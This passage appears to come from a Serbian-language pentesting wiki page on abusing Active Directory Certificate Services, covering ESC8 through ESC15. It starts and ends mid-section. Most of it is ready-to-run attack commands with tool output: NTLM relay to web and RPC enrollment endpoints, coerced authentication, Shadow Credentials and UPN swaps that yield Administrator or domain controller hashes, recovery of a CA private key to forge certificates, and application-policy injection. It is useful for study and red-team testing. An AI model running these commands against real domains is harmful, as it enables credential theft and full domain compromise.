   *Ako predložak već ne definiše ekstenziju *Certificate Issuance Policies*, navedena vrednost biće sačuvana nakon izdavanja.*

3. **Pošaljite zahtev** (ako vaša uloga ima i prava za odobravanje *Manage Certificates*) ili sačekajte da ga operator odobri. Kada bude izdat, preuzmite sertifikat:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Rezultujući sertifikat sada sadrži zlonamerni OID politike izdavanja i može se koristiti u narednim napadima (npr. ESC13, eskalacija privilegija na domenu itd.).

> NAPOMENA: Isti napad može da se izvrši pomoću Certipy ≥ 4.7, putem komande `ca` i parametra `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Objašnjenje

> [!TIP]
> U okruženjima u kojima je **instaliran AD CS**, ako postoji **ranjiva krajnja tačka za web upis** i objavljen je bar jedan **šablon sertifikata** koji dozvoljava **upis računara u domenu i autentifikaciju klijenta** (kao što je podrazumevani šablon **`Machine`**), napadač može da kompromituje **bilo koji računar na kojem je aktivna usluga spooler**!

AD CS podržava nekoliko metoda upisa zasnovanih na **HTTP-u**, koje su dostupne putem dodatnih serverskih uloga koje administratori mogu da instaliraju. Ovi interfejsi za upis sertifikata zasnovan na HTTP-u podložni su **NTLM relay napadima**. Napadač može sa **kompromitovane mašine da se predstavi kao bilo koji AD nalog koji se autentifikuje putem dolaznog NTLM-a**. Dok se predstavlja kao nalog žrtve, napadač može da pristupi ovim web interfejsima i **zatraži sertifikat za autentifikaciju klijenta koristeći šablon sertifikata `User` ili `Machine`**.

- **Interfejs za web upis** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`) podrazumevano koristi samo HTTP, što ne pruža zaštitu od NTLM relay napada. Pored toga, u zaglavlju HTTP Authorization izričito dozvoljava samo NTLM autentifikaciju, zbog čega bezbedniji metodi autentifikacije, kao što je Kerberos, ne mogu da se koriste.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service i **Network Device Enrollment Service** (NDES) podrazumevano podržavaju negotiate autentifikaciju putem zaglavlja HTTP Authorization. Negotiate autentifikacija **podržava i** Kerberos i **NTLM**, što napadaču omogućava da tokom relay napada **obori autentifikaciju na NTLM**. Iako ove web usluge podrazumevano omogućavaju HTTPS, samo HTTPS **ne štiti od NTLM relay napada**. Zaštita HTTPS usluga od NTLM relay napada moguća je samo kada se HTTPS koristi zajedno sa vezivanjem kanala. Nažalost, AD CS ne aktivira Extended Protection for Authentication u IIS-u, što je neophodno za vezivanje kanala.<sup>[[6]](#references)</sup>

Čest **problem** kod NTLM relay napada jeste **kratko trajanje NTLM sesija** i nemogućnost napadača da komunicira sa uslugama koje **zahtevaju NTLM signing**.

Ipak, ovo ograničenje može da se prevaziđe iskorišćavanjem NTLM relay napada za pribavljanje sertifikata za korisnika, jer trajanje sesije određuje period važenja sertifikata, a sertifikat može da se koristi sa uslugama koje **zahtevaju NTLM signing**. Uputstva za korišćenje ukradenog sertifikata potražite ovde:


{{#ref}}
account-persistence.md
{{#endref}}

Još jedno ograničenje NTLM relay napada jeste to što **nalog žrtve mora da se autentifikuje na mašini koju kontroliše napadač**. Napadač može ili da sačeka ili da pokuša da **iznudi** ovu autentifikaciju:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Zloupotreba**

Komanda `cas` u alatu [**Certify**](https://github.com/GhostPack/Certify) izlistava **omogućene HTTP krajnje tačke AD CS-a**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koriste enterprise Certificate Authorities (CA) za čuvanje krajnjih tačaka Certificate Enrollment Service (CES). Ove krajnje tačke mogu se parsirati i izlistati pomoću alata **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba pomoću Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Zloupotreba pomoću [Certipy](https://github.com/ly4k/Certipy)

Certipy podrazumevano podnosi zahtev za sertifikat na osnovu šablona `Machine` ili `User`, u zavisnosti od toga da li se naziv naloga čija se autentifikacija prosleđuje završava znakom `$`. Drugi šablon može se navesti pomoću parametra `-template`.

Zatim se može primeniti tehnika kao što je [PetitPotam](https://github.com/ly4k/PetitPotam) da bi se iznudila autentifikacija. Kada su u pitanju kontroleri domena, potrebno je navesti `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

Vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, označena kao ESC9, izostavlja SID proširenje `szOID_NTDS_CA_SECURITY_EXT` iz sertifikata. Stariji primeri ESC9 zavise od ponašanja KDC-a radi kompatibilnosti (`StrongCertificateBindingEnforcement=1`) ili od zasebnog puta za slabo mapiranje Schannel-a. Vrednost `1` je **istorijska postavka kompatibilnosti**, a ne podrazumevana trenutna vrednost: Microsoft navodi da je KDC override prestao da bude podržan bezbednosnim ažuriranjem za Windows od 9. septembra 2025. Proverite koja su ažuriranja zaista instalirana na cilju i koju krajnju tačku za autentifikaciju koristite pre primene starijeg postupka.<sup>[[7]](#references)</sup> Pogledajte [Microsoft-ove smernice za uvođenje](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Uslovi pod kojima podešavanje ove zastavice postaje značajno obuhvataju:

- Na starijem, kompatibilnom KDC-u, efektivna politika vezivanja sertifikata dozvoljava mapiranje; alternativno, krajnja tačka Schannel-a zasebno omogućava UPN mapiranje pomoću bita `0x4` u `CertificateMappingMethods`.
- Sertifikat je označen zastavicom `CT_FLAG_NO_SECURITY_EXTENSION` u okviru postavke `msPKI-Enrollment-Flag`.
- Sertifikat navodi bilo koji EKU za klijentsku autentifikaciju.
- Dostupne su `GenericWrite` dozvole nad nekim nalogom radi kompromitovanja drugog naloga.

### Scenario zloupotrebe

Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad nalogom `Jane@corp.local` i da želi da kompromituje nalog `Administrator@corp.local`. Šablon sertifikata `ESC9`, u koji `Jane@corp.local` ima dozvolu da se upiše, konfigurisan je sa zastavicom `CT_FLAG_NO_SECURITY_EXTENSION` u postavci `msPKI-Enrollment-Flag`.

Najpre se preuzima hash naloga `Jane` pomoću Shadow Credentials, zahvaljujući John-ovim `GenericWrite` dozvolama:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Nakon toga, `userPrincipalName` korisnika `Jane` menja se u `Administrator`, namerno izostavljajući deo domena `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Ova izmena ne krši ograničenja, jer `Administrator@corp.local` ostaje različit od `userPrincipalName` vrednosti za `Administrator`.

Nakon toga se traži ranjivi šablon sertifikata `ESC9` kao `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Primećeno je da `userPrincipalName` sertifikata odražava vrednost `Administrator`, bez ikakvog „object SID”.

`userPrincipalName` naloga `Jane` zatim se vraća na prvobitnu vrednost, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Pokušaj autentifikacije pomoću izdatog sertifikata sada daje NT hash za `Administrator@corp.local`. Komanda mora da sadrži `-domain <domain>` jer sertifikat ne navodi domen:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Slaba mapiranja sertifikata - ESC10

### Objašnjenje

U okviru ESC10 često se razmatraju dve zasebne smernice za mapiranje sertifikata. Pročitajte podešavanje na krajnjoj tački koja zaista obrađuje relevantnu autentifikaciju:

- Schannel `CertificateMappingMethods` u okviru `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` kontroliše mapiranje klijentskih sertifikata za TLS na aplikacionom serveru. UPN bit je `0x4`; podrazumevana vrednost na ažuriranim sistemima je `0x18` (`0x8 | 0x10`).
- KDC `StrongCertificateBindingEnforcement` u okviru `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` istorijski je kontrolisao kompatibilnost vezivanja Kerberos sertifikata. Vrednost `1` nije pouzdana trenutna podrazumevana vrednost, a Microsoft je ukinuo podršku za ovo nadjačavanje bezbednosnim ažuriranjem za Windows od 9. septembra 2025. Njegovo stanje samo po sebi ne opisuje Schannel-ovo UPN mapiranje.<sup>[[7]](#references)</sup>

**Slučaj 1**

Istorijski, kada je stariji KDC poštovao `StrongCertificateBindingEnforcement=0`; proverite nivo ažuriranja jer ovo nadjačavanje više nije podržano na trenutno zakrpljenim sistemima.

**Slučaj 2**

Kada je na krajnjoj tački Schannel klijentskog sertifikata omogućen UPN bit (`0x4`) za `CertificateMappingMethods`. Ovo je zasebno podešavanje od KDC-ovog sprovođenja jakog vezivanja i i dalje zahteva sertifikat za autentifikaciju klijenta za koji je moguće izvršiti enroll, kao i efektivnu kontrolu nad mapiranim atributom naloga.

### Slučaj zloupotrebe 1

U starijem okruženju u kom KDC i dalje poštuje `StrongCertificateBindingEnforcement=0`, kontrola nad nalogovim `userPrincipalName` može biti deo putanje slabog mapiranja do drugog naloga. Potrebno je zasebno proveriti izdavanje sertifikata, mapiranje, ciljni identitet i uspešnu autentifikaciju; ACE `GenericWrite` ili vrednost registra sami po sebi ne dokazuju preuzimanje naloga.

Na primer, ako ima `GenericWrite` dozvole nad `Jane@corp.local`, napadač želi da kompromituje `Administrator@corp.local`. Postupak je sličan ESC9 i omogućava upotrebu bilo kog šablona sertifikata.

Prvo se preuzima hash naloga `Jane` pomoću Shadow Credentials, iskorišćavajući `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Nakon toga, `userPrincipalName` korisnika `Jane` menja se u `Administrator`, pri čemu se namerno izostavlja deo `@corp.local` da bi se izbeglo kršenje ograničenja.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Zatim se, kao `Jane`, zahteva sertifikat koji omogućava autentifikaciju klijenta, koristeći podrazumevani šablon `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` za `Jane` se zatim vraća na prvobitnu vrednost, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Autentifikacija pomoću dobijenog sertifikata otkriće NT hash naloga `Administrator@corp.local`. Pošto sertifikat ne sadrži podatke o domenu, domen je potrebno navesti u komandi.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Slučaj zloupotrebe 2

Kada `CertificateMappingMethods` sadrži bit-flag `UPN` (`0x4`), nalog A sa dozvolama `GenericWrite` može da kompromituje bilo koji nalog B koji nema svojstvo `userPrincipalName`, uključujući mašinske naloge i ugrađeni administrator domena `Administrator`.

Ovde je cilj da se kompromituje `DC$@corp.local`, počevši od pribavljanja hash-a naloga `Jane` pomoću Shadow Credentials, uz iskorišćavanje dozvole `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`userPrincipalName` korisnika `Jane` se zatim postavlja na `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Zahteva se sertifikat za autentifikaciju klijenta kao `Jane`, koristeći podrazumevani šablon `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` korisnice `Jane` se nakon ovog procesa vraća na prvobitnu vrednost.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Za autentifikaciju putem Schannel-a koristi se Certipy-jeva opcija `-ldap-shell`, što ukazuje na uspešnu autentifikaciju kao `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Preko LDAP shell-a, komande kao što je `set_rbcd` omogućavaju napade pomoću Resource-Based Constrained Delegation (RBCD), što potencijalno može dovesti do kompromitovanja kontrolera domena.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Ova ranjivost se odnosi i na svaki korisnički nalog kojem nedostaje `userPrincipalName` ili gde se on ne podudara sa `sAMAccountName`. Podrazumevani nalog `Administrator@corp.local` posebno je zanimljiva meta zbog svojih povišenih LDAP privilegija i činjenice da mu `userPrincipalName` podrazumevano nedostaje.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

Ako CA Server nije konfigurisan sa `IF_ENFORCEENCRYPTICERTREQUEST`, moguće je izvesti NTLM relay napade bez potpisivanja putem RPC servisa. [Referenca](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Možete koristiti `certipy` da proverite da li je opcija `Enforce Encryption for Requests` onemogućena. `certipy` će prikazati ranjivosti `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Scenario zloupotrebe

Potrebno je podesiti relay server:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Napomena: Za kontrolere domena, moramo da navedemo `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access to ADCS CA with YubiHSM - ESC12

### Objašnjenje

Administratori mogu da podese Certificate Authority tako da bude smešten na eksternom uređaju, kao što je „Yubico YubiHSM2“.

Ako je USB uređaj povezan sa CA serverom preko USB porta ili preko USB servera u slučaju kada je CA server virtuelna mašina, za Key Storage Provider je potreban authentication key (ponekad se naziva „password“) da bi generisao i koristio ključeve u YubiHSM-u.

Ovaj ključ/password čuva se u registru u čistom tekstu, pod ključem `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenario zloupotrebe

Ako je privatni ključ CA smešten na fizičkom USB uređaju kada dobijete shell access, moguće je da ga oporavite.

Prvo je potrebno da pribavite CA sertifikat (javan je), a zatim:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

На крају употребите команду certutil `-sign` да бисте фалсификовали нови произвољни сертификат користећи CA сертификат и његов приватни кључ.

## OID Group Link Abuse - ESC13

### Објашњење

Атрибут `msPKI-Certificate-Policy` омогућава додавање политике издавања у шаблон сертификата. Објекти `msPKI-Enterprise-Oid`, који су одговорни за издавање политика, могу се пронаћи у Configuration Naming Context-у (CN=OID,CN=Public Key Services,CN=Services) PKI OID контејнера. Политика се може повезати са AD групом помоћу атрибута `msDS-OIDToGroupLink` овог објекта, што систему омогућава да овласти корисника који предочи сертификат као да је члан те групе. [Референца је овде](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Другим речима, када корисник има дозволу да упише сертификат, а сертификат је повезан са OID групом, корисник може да наследи привилегије те групе.

Употребите [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) да бисте пронашли OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Scenario zloupotrebe

Pronađite korisničku dozvolu koju možete iskoristiti pomoću `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu za upis u `VulnerableTemplate`, korisnik može da nasledi privilegije grupe `VulnerableGroup`.

Sve što treba da uradi jeste da navede predložak i dobiće sertifikat sa pravima `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Explicit Certificate Mapping Abuse — ESC14

### Objašnjenje

Opis na https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping izuzetno je detaljan. U nastavku je citat izvornog teksta.<sup>[[14]](#references)</sup>

ESC14 se bavi ranjivostima koje nastaju zbog „slabog eksplicitnog mapiranja sertifikata“, prvenstveno usled zloupotrebe ili nebezbedne konfiguracije atributa `altSecurityIdentities` na korisničkim ili računarskim nalozima u Active Directory-ju. Ovaj atribut sa više vrednosti omogućava administratorima da ručno povežu X.509 sertifikate sa AD nalogom u svrhe autentifikacije. Kada se popune, ova eksplicitna mapiranja mogu da nadjačaju podrazumevanu logiku mapiranja sertifikata, koja se obično oslanja na UPN-ove ili DNS imena u SAN-u sertifikata, odnosno na SID ugrađen u bezbednosno proširenje `szOID_NTDS_CA_SECURITY_EXT`.

Do „slabog“ mapiranja dolazi kada je vrednost niske koja se koristi u atributu `altSecurityIdentities` za identifikaciju sertifikata previše opšta, lako pogodiva, oslanja se na nejedinstvena polja sertifikata ili koristi komponente sertifikata koje se lako mogu lažirati. Ako napadač može da pribavi ili napravi sertifikat čiji se atributi podudaraju sa tako slabo definisanim eksplicitnim mapiranjem privilegovanog naloga, može da koristi taj sertifikat za autentifikaciju kao taj nalog i njegovo lažno predstavljanje.

Primeri potencijalno slabih niskih za mapiranje u `altSecurityIdentities` obuhvataju:

- Mapiranje isključivo prema uobičajenom Common Name-u (CN) subjekta: npr. `X509:<S>CN=SomeUser`. Napadač bi mogao da pribavi sertifikat sa ovim CN-om iz manje bezbednog izvora.
- Upotrebu previše opštih izdavalaca Distinguished Name-ova (DN) ili DN-ova subjekta bez dodatnog uslova, kao što su određeni serijski broj ili identifikator ključa subjekta: npr. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Upotrebu drugih predvidljivih obrazaca ili nekriptografskih identifikatora koje bi napadač mogao da ispuni sertifikatom koji može legitimno da pribavi ili falsifikuje (ako je kompromitovao CA ili pronašao ranjiv šablon, kao u ESC1).

Atribut `altSecurityIdentities` podržava različite formate mapiranja, kao što su:

- `X509:<I>IssuerDN<S>SubjectDN` (mapira prema punom DN-u izdavaoca i subjekta)
- `X509:<SKI>SubjectKeyIdentifier` (mapira prema vrednosti proširenja Subject Key Identifier sertifikata)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapira prema serijskom broju, koji je implicitno određen DN-om izdavaoca) — ovo nije standardni format; obično se koristi `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapira prema imenu RFC822, obično adresi e-pošte, iz SAN-a)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapira prema SHA1 hešu sirovog javnog ključa sertifikata — uglavnom je snažno)

Bezbednost ovih mapiranja zavisi od identifikatora koji se u njima koriste. Microsoft klasifikuje mapiranja zasnovana na adresama e-pošte ili imenima subjekata, uključujući `X509:<RFC822>`, kao **slaba**. U režimu Full Enforcement, sertifikat bez snažnog mapiranja se odbacuje; bezbednosna ispravka za Windows iz septembra 2025. uklonila je mogućnost povratka u režim Compatibility. Zato samo slabo mapiranje nije pouzdan način za lažno predstavljanje u aktuelnim okruženjima. Pre procene scenarija sa slabim mapiranjem proverite stvarni nivo ispravki kontrolera domena i njegovo ponašanje pri mapiranju sertifikata. Pravo upisa u `altSecurityIdentities` predstavlja zaseban trag: napadač sa odgovarajućim pouzdanim sertifikatom možda može da doda **snažno** eksplicitno mapiranje, u zavisnosti od efektivnih dozvola i validacije sertifikata. Pogledajte [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) i [istraživanje o ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Potrebno je dijagnostikovati i greške pri autentifikaciji sertifikatom: onemogućen ciljni nalog ili istekla lozinka mogu da spreče prijavljivanje čak i kada je sam sertifikat i dalje važeći.

### Scenario zloupotrebe

ESC14 cilja **eksplicitna mapiranja sertifikata** u Active Directory-ju (AD), tačnije atribut `altSecurityIdentities`. Ako je ovaj atribut postavljen (namerno ili usled pogrešne konfiguracije), napadači mogu da se lažno predstavljaju kao nalozi tako što predstave sertifikate koji odgovaraju mapiranju.

#### Scenario A: Napadač može da upisuje u `altSecurityIdentities`

 **Preduslov**: Napadač ima dozvole za upis u atribut `altSecurityIdentities` ciljnog naloga ili dozvolu da dodeli takvu dozvolu u vidu jedne od sledećih dozvola nad ciljnim AD objektom:  
- Upis u svojstvo `altSecurityIdentities`  
- Upis u svojstvo `Public-Information`  
- Upis u sva svojstva  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Vlasnik*.
#### Scenario B: Cilj ima slabo mapiranje X509RFC822 (e-pošta)

- **Istorijski/uslovni preduslov**: Cilj ima slabo mapiranje X509RFC822 u `altSecurityIdentities`, napadač može da izmeni atribut `mail` korisnika koji se upisuje u sertifikat, a odgovarajući šablon uključuje tu adresu e-pošte u sertifikat za autentifikaciju klijenta bez konfliktnog SID-a. Za autentifikaciju je takođe neophodno okruženje koje i dalje prihvata slabo mapiranje; Full Enforcement odbacuje sertifikate koji imaju samo slabo mapiranje. Mogućnost upisa u atribut `mail` sama po sebi predstavlja samo trag.
#### Scenario C: Cilj ima mapiranje X509IssuerSubject

- **Preduslov**: Cilj ima slabo eksplicitno mapiranje X509IssuerSubject u `altSecurityIdentities`. Napadač može da postavi atribut `cn` ili `dNSHostName` na principalu žrtve tako da odgovara subjektu mapiranja X509IssuerSubject cilja. Zatim napadač može da upiše sertifikat kao žrtva i da ga koristi za autentifikaciju kao cilj.
#### Scenario D: Cilj ima mapiranje X509SubjectOnly

- **Preduslov**: Cilj ima slabo eksplicitno mapiranje X509SubjectOnly u `altSecurityIdentities`. Napadač može da postavi atribut `cn` ili `dNSHostName` na principalu žrtve tako da odgovara subjektu mapiranja X509SubjectOnly cilja. Zatim napadač može da upiše sertifikat kao žrtva i da ga koristi za autentifikaciju kao cilj.
### konkretne operacije
#### Scenario A

Zatražite sertifikat koristeći šablon sertifikata `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Sačuvajte i konvertujte sertifikat

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Autentifikujte se (koristeći sertifikat)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Čišćenje (opciono)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Za konkretnije metode napada u različitim scenarijima napada pogledajte sledeće: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Objašnjenje

[Originalno istraživanje o ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) objašnjava kako smernice aplikacije navedene u zahtevu za V1 template mogu da nadjačaju konfigurisani Extended Key Usage na **nezakrpljenom CA-u za izdavanje**.<sup>[[15]](#references)</sup> Kandidatu je potreban i objavljen template u koji je moguće upisati se, a koji dozvoljava potrebna svojstva subjekta/zahteva i nema prepreku u vidu odobrenja ili potpisa. Sama prava za upis ne dokazuju da je eksploatacija moguća. Korišćenje Certificate Request Agent-a može dodatno zavisiti od odgovarajućeg drugog template-a i ograničenja za enrollment-agent; pre nego što tvrdite da je taj put moguć, proverite stanje zakrpa za CA i rezultat izdavanja.

### Zloupotreba

[Dokumentacija za eskalaciju privilegija u Certipy-ju](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) sadrži detaljnije primere upotrebe.<sup>[[14]](#references)</sup>


Komanda `find` u Certipy-ju može da pomogne u identifikovanju V1 template-a koji su potencijalno podložni ESC15 ako CA nije zakrpljen.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenario A: Direktno lažno predstavljanje preko Schannel

**Korak 1: Zatražite sertifikat, ubacujući „Client Authentication“ Application Policy i ciljni UPN.** Napadač `attacker@corp.local` cilja `administrator@corp.local` koristeći šablon „WebServer“ V1 (koji dozvoljava da podnosilac zahteva navede subject).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Ranljivi V1 template sa opcijom „Enrollee supplies subject“.
- `-application-policies 'Client Authentication'`: Ubacuje OID `1.3.6.1.5.5.7.3.2` u ekstenziju Application Policies u CSR-u.
- `-upn 'administrator@corp.local'`: Postavlja UPN u SAN-u radi impersonacije.

**Korak 2: Autentifikujte se preko Schannel-a (LDAPS) koristeći dobijeni sertifikat.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Сценарио B: PKINIT/Kerberos impersonacija zloupotrebom agenta za upis

**Korak 1: Zatražite sertifikat iz V1 šablona (sa opcijom „Enrollee supplies subject“) i ubacite Application Policy „Certificate Request Agent“.** Ovaj sertifikat je namenjen napadaču (`attacker@corp.local`) kako bi postao agent za upis. Ovde se ne navodi UPN za identitet samog napadača, jer je cilj da dobije mogućnost delovanja kao agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Umeće OID `1.3.6.1.4.1.311.20.2.1`.

**Korak 2: Upotrebite „agent“ sertifikat da zatražite sertifikat u ime ciljane privilegovane korisničke naloge.** Ovo je korak sličan ESC3, koji koristi sertifikat iz Koraka 1 kao agent sertifikat.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
